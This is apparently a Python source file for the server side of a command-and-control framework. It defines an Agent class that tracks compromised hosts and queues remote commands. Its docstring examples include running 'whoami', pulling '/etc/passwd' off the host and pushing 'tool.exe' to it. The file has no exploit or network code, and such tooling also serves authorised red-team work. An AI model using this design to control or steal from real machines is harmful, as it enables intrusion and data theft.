from typing import Dict, List, Optional, Any
from datetime import datetime

class Agent:
    def __init__(self, id, ipaddr, hostname, user):
        self.id = id
        self.ipaddr = ipaddr
        self.hostname = hostname
        self.user = user
        self.commands: Dict[int, Dict[str, Any]] = {}
        self.command_counter = 1
        self.uploaded_files = []  # Track uploaded files from this agent
        self.downloaded_files = []  # Track files sent to this agent
        self.last_seen = datetime.now().isoformat()  # Track last communication
        self.joined_at = datetime.now().isoformat()  # Track when agent joined
        self.sleep_time = 3  # Agent polling interval in seconds (default: 3)

    def add_command(self, command_type: str, command_data: Dict[str, Any]) -> int:
        """
        Add a new command to the queue

        Args:
            command_type: "exec", "upload", "download", "terminate", "list_directory", or "set_sleep_time"
            command_data: Command-specific data dict
                - exec: {"command": "whoami"}
                - upload: {"source_path": "/etc/passwd", "filename": "passwd.txt"}
                - download: {"url": "/files/tool.exe", "save_as": "tool.exe"}
                - terminate: {} (no data needed, gracefully shuts down agent)
                - list_directory: {"path": "/path/to/directory"}
                - set_sleep_time: {"sleep_time": 5}

        Returns:
            command_id: The ID of the created command
        """
        command_id = self.command_counter
        self.commands[command_id] = {
            'type': command_type,
            'data': command_data,
            'result': None,
            'status': 'pending',  # pending, retrieved, completed, failed
            'created_at': datetime.now().isoformat(),
            'retrieved_at': None,
            'completed_at': None
        }
        self.command_counter += 1
        return command_id

    def get_commands(self) -> List[Dict[str, Any]]:
        """Return commands that haven't been retrieved yet"""
        pending = []
        for cid, cmd in self.commands.items():
            if cmd['status'] == 'pending':
                pending.append({
                    'command_id': cid,
                    'type': cmd['type'],
                    'data': cmd['data']
                })
                # Mark as retrieved
                cmd['status'] = 'retrieved'
                cmd['retrieved_at'] = datetime.now().isoformat()
        return pending

    def set_result(self, command_id: int, status: str, result: Optional[str] = None,
                   error: Optional[str] = None) -> bool:
        """
        Set the result of a command

        Args:
            command_id: The command ID
            status: "success" or "error"
            result: Command output (for exec) or success message
            error: Error message if status is "error"
        """
        if command_id in self.commands:
            self.commands[command_id]['result'] = result
            self.commands[command_id]['status'] = 'completed' if status == 'success' else 'failed'
            self.commands[command_id]['error'] = error
            self.commands[command_id]['completed_at'] = datetime.now().isoformat()
            return True
        return False

    def get_result(self, command_id: int) -> Optional[Dict[str, Any]]:
        """Get the result of a specific command"""
        if command_id in self.commands:
            cmd = self.commands[command_id]
            return {
                'command_id': command_id,
                'type': cmd['type'],
                'data': cmd['data'],
                'status': cmd['status'],
                'result': cmd['result'],
                'error': cmd.get('error'),
                'created_at': cmd['created_at'],
                'completed_at': cmd.get('completed_at')
            }
        return None

    def add_uploaded_file(self, filename: str, filepath: str, size: int):
        """Track a file uploaded from this agent"""
        self.uploaded_files.append({
            'filename': filename,
            'filepath': filepath,
            'size': size,
            'uploaded_at': datetime.now().isoformat()
        })

    def add_downloaded_file(self, filename: str):
        """Track a file downloaded by this agent"""
        self.downloaded_files.append({
            'filename': filename,
            'downloaded_at': datetime.now().isoformat()
        })

    def update_last_seen(self):
        """Update the last seen timestamp"""
        self.last_seen = datetime.now().isoformat()

    def set_sleep_time(self, sleep_time: int):
        """Update the agent's sleep time"""
        self.sleep_time = sleep_time

    def to_dict(self) -> Dict[str, Any]:
        """Return agent info as dictionary for API responses"""
        return {
            'id': self.id,
            'ipaddr': self.ipaddr,
            'hostname': self.hostname,
            'user': self.user,
            'last_seen': self.last_seen,
            'joined_at': self.joined_at,
            'total_commands': len(self.commands),
            'uploaded_files_count': len(self.uploaded_files),
            'downloaded_files_count': len(self.downloaded_files),
            'sleep_time': self.sleep_time
        }
